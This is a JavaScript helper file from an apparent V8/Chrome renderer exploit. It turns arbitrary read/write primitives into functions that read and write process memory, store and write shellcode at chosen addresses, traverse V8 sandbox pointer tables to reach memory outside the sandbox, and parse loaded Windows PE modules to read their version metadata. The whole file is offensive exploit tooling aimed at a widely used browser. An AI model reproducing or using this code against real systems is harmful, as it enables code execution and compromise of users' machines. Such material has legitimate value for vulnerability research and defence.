// Utils to manipulate the renderer memory using arbRead() & arbWrite() primitives
{
    // Read data (BigInt) at specified address
    // 1 <= size <= 8
    function getBigUint(addr, size=8) {
        assert(1 <= size && size <= 8, `[-] Invalid size ${size} for reading data at 0x${addr}`);

        let data = arbRead(addr);
        let mask = 2n ** (8n*BigInt(size)) - 1n;
        return data & mask;
    }


    // Write data (BigInt) at specified address
    // 1 <= size <= 8
    function setBigUint(addr, data, size=8) {
        assert(1 <= size && size <= 8, `[-] Invalid size ${size} for writing 0x${hex(data)} at 0x${addr}`);
        assert((data >> 8n*BigInt(size)) === 0n, `[-] Invalid size ${size} for writing 0x${hex(data)} at 0x${addr}`);

        let current_data = size < 8 ? getBigUint(addr, 8) : 0x0n;
        let mask = ~(2n ** (8n*BigInt(size)) - 1n);
        data = (current_data & mask) + data;
        arbWrite(addr, data);
    }


    // Read string at specified address (return as byte array)
    // Truncate if string length > maxlen
    function getStringArr(addr, maxlen=100) {
        function check(bytes) {
            let min = bytes.length > 8 ? bytes.length-9 : 0;
            for (let k = min; k < bytes.length; k++) {
                if (bytes.slice(k, k+2).every(x => x === 0)) {
                    return bytes.slice(0, k+2);
                }
            }
            return bytes
        }

        let bytes = [];
        for (let k = 0n; k*8n < BigInt(maxlen); k++) {
            bytes = bytes.concat(i64arr(getBigUint(addr + k*8n)));
            bytes = check(bytes);
            if (bytes.slice(-2).every(x => x === 0)) { return bytes; }
        }

        return bytes;
    }


    // Copy data to a new buffer and return its address
    function getDataAddr(data) {
        let buf = new ArrayBuffer(data.length);
        saveObject(buf);

        let dataview = new DataView(buf);
        for (let i = 0; i < data.length; i++)
        {
            dataview.setUint8(i, data[i]);
        }

        let buf_struct = new STRUCTS.JSArrayBuffer(addrOf(buf));
        let backing_store = sbxMemory.getBigUint64(buf_struct.backing_store, true) >> 3n*8n;
        let addr = untagPtr(SANDBOX_BASE + backing_store);

        log(`[+] Stored ${data.length} bytes of data at 0x${hex(addr)}`, 4);
        return addr;
    }


    // Write shellcode at specified address
    function writeShellcode(shellcode, addr) {
        let i64_bytes = [];
        for (let i = 0; i < shellcode.length; i++) {
            i64_bytes.push(shellcode[i]);

            if (i64_bytes.length === 8 || i === shellcode.length-1) {
                let i64_data = 0n;
                for (let k = 0n; k < i64_bytes.length; k++) {
                    i64_data += BigInt(i64_bytes[k]) << k*8n;
                }

                let data_addr = addr + BigInt(i - i64_bytes.length + 1);
                setBigUint(data_addr, i64_data);

                i64_bytes = [];
            }
        }
    }


    // Traverse cages to resolve addresses outside of the V8 sandbox
    function uncage(caged_ptr, ptr_table_addr, shift=9n) {
        let index = caged_ptr >> shift;
        assert((index << shift) === caged_ptr, "[-] Invalid caged handle")
        return getBigUint(ptr_table_addr + index*8n) & 0xffffffffffffn;
    }


    // Parse a loaded PE to extract specific metadata from its RT_VERSION resource
    function getPEVersion(base_addr, metadata="FileVersion") {
        log("[i] Parsing PE at 0x" + hex(base_addr), 2);
        assert(base_addr > 0n && (base_addr & 0xffffn) === 0x0n, "[-] Invalid PE base address");

        // Parse PE headers
        let dos_header = base_addr;
        let nt_header = base_addr + getBigUint(dos_header + 0x3Cn, 4);
        let number_of_sections = getBigUint(nt_header + 6n, 2);
        let sections_header = nt_header + 0x108n;

        // Iterate over sections
        for (let k = 0n; k < number_of_sections; k++) {
            let section_header_addr = sections_header + k*0x28n;
            let section_name = arrToString(getStringArr(section_header_addr));

            // Find resources section
            if (section_name === ".rsrc") {
                let root = base_addr + getBigUint(section_header_addr + 12n, 4);
                let number_of_named_entries = getBigUint(root + 0x0cn, 2);
                let number_of_id_entries = getBigUint(root + 0x0en, 2);

                // Get a resource directory entry
                let get_entry = (directory, index, skip_named=false) => {
                    index = BigInt(index) * 8n;
                    if (skip_named) {
                        let number_of_named_entries = getBigUint(root + directory + 0x0cn, 2);
                        index += number_of_named_entries * 8n;
                    }

                    let entry = root + directory + 0x10n + index;
                    let entry_offset = getBigUint(entry + 0x4n, 4);
                    let is_dir = !!(entry_offset & (1n << 31n));

                    return [entry_offset & ~(2n**31n), is_dir];
                }

                // Iterate over resources ID entries
                for (let l = 0n; l < number_of_named_entries + number_of_id_entries; l++) {
                    let entry_id = getBigUint(root + 0x10n + l*8n, 4);

                    // Find RT_VERSION entry
                    if (entry_id === 0x10n) {
                        let [name_dir, is_name_dir] = get_entry(0x0n, l);

                        // Go through firsts Name & Lang directories
                        if (!is_name_dir) continue;
                        let [lang_dir, is_lang_dir] = get_entry(name_dir, 0, true);
                        if (!is_lang_dir) continue;
                        let [data_entry, is_data_dir] = get_entry(lang_dir, 0, true);

                        // Parse Resource Data Entry
                        if (is_data_dir) continue;
                        let offset_to_data = getBigUint(root + data_entry, 4);
                        let size = getBigUint(root + data_entry + 0x04n, 4);

                        // Find target metadata
                        let offset = 0;
                        let rsrc_version_addr = base_addr + offset_to_data;
                        let rsrc_version_data = getStringArr(rsrc_version_addr);
                        while (offset < size && !arrToString(rsrc_version_data).endsWith(metadata)) {
                            offset += rsrc_version_data.length;
                            rsrc_version_data = getStringArr(rsrc_version_addr + BigInt(offset));
                        }
                        assert(arrToString(rsrc_version_data).endsWith(metadata), `[-] Failed to retrieve PE ${metadata} metadata`);

                        // Find target metadata value
                        offset += rsrc_version_data.length;
                        while (offset < size && !arrToString(getStringArr(rsrc_version_addr + BigInt(offset)))) {
                            offset += 1;
                        }
                        let file_version = arrToString(getStringArr(rsrc_version_addr + BigInt(offset)));
                        return file_version;
                    }
                }
            }
        }

        assert(false, "[-] Failed to retrieve version for PE at 0x" + hex(base_addr));
    }
}
